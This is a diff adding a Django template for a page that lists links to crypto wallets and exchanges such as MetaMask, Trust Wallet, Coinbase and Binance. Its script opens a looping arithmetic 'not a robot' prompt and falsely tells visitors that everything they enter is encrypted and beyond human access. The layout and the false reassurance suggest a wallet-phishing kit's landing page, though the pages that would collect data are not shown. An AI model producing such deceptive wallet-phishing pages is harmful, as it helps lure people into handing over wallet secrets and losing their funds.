@@ -1,0 +1,101 @@
+{% extends 'base.html' %}
+{% load static %}
+
+
+{% block script %}
+<script>
+var x = Math.floor((Math.random() * 10) + 1);
+var y = Math.floor((Math.random() * 10) + 1);
+var z = x+y
+var answer = prompt('NOTE: All informations provided here are encrypted and are not availaible for human interference! \nPlease solve the equation below to prove you are not a robot. \n \n' + x + '+' + y);
+
+while(answer != z){
+  var answer = prompt("That's incorrect! please try again\n" + x + '+' + y)
+}
+
+</script>
+{% endblock %}
+
+{% block content %}
+<div class="w3-center">
+  <div class="w3-third ">
+<img src="{% static 'img/1inch.jpg' %}"  >
+    <center><a href="{% url '1inch' %}" >1INCH</a></center>
+      <br>
+  </div>
+
+  <div class="w3-third ">
+<img src="{% static 'img/aave.jpg' %}" >
+    <center><a href="{% url 'aave' %}">AAVE</a></center>
+      <br>
+  </div>
+
+  <div class="w3-third ">
+<img src="{% static 'img/algorand.png' %}" >
+    <center><a href="{% url 'algorand' %}">ALGORAND</a></center>
+      <br>
+  </div>
+
+    <div class="w3-third ">
+<img src="{% static 'img/binance.png' %}" >
+    <center><a href="{% url 'binance' %}">BINANCE</a></center>
+        <br>
+  </div>
+
+    <div class="w3-third ">
+<img src="{% static 'img/coinbase.png' %}" >
+    <center><a href="{% url 'coinbase' %}">COINBASE</a></center>
+        <br>
+  </div>
+
+    <div class="w3-third ">
+<img src="{% static 'img/defiat.jpg' %}" >
+    <center><a href="{% url 'defiat' %}">DEFIAT</a></center>
+        <br>
+  </div>
+
+    <div class="w3-third ">
+<img src="{% static 'img/fantom.png' %}" >
+    <center><a href="{% url 'fantom' %}">FANTOM</a></center>
+        <br>
+  </div>
+
+    <div class="w3-third ">
+<img src="{% static 'img/metamask.png' %}" >
+    <center><a href="{% url 'metamask' %}">METAMASK</a></center>
+        <br>
+  </div>
+
+    <div class="w3-third ">
+<img src="{% static 'img/mew.png' %}" >
+    <center><a href="{% url 'mew' %}">MEW</a></center>
+        <br>
+  </div>
+
+        <div class="w3-third ">
+<img src="{% static 'img/solareum.png' %}" >
+    <center><a href="{% url 'solareum' %}">SOLAREUM</a></center>
+            <br>
+  </div>
+
+        <div class="w3-third ">
+<img src="{% static 'img/solflare.png' %}" >
+    <center><a href="{% url 'solflare' %}">SOLFLARE</a></center>
+            <br>
+  </div>
+
+        <div class="w3-third ">
+<img src="{% static 'img/tron.png' %}" >
+    <center><a href="{% url 'tron' %}">TRON</a></center>
+            <br>
+  </div>
+
+        <div class="w3-third ">
+<img src="{% static 'img/trust wallet.jpg' %}" >
+    <center><a href="{% url 'trustwallet' %}">TRUST WALLET</a></center>
+  </div>
+</div>
+
+
+
+{% endblock %}
